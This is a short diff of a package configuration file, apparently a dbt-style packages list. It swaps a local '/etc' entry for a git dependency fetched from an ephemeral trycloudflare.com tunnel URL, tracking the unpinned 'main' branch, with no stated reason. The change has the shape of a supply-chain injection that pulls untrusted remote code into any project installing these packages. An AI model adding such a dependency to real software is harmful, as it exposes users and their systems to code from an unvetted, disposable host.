@@ -1,2 +1,3 @@
 packages:
-  - local: /etc
+  - git: "https://deposits-scholarship-bias-plastics.trycloudflare.com/pkg.git"
+    revision: main
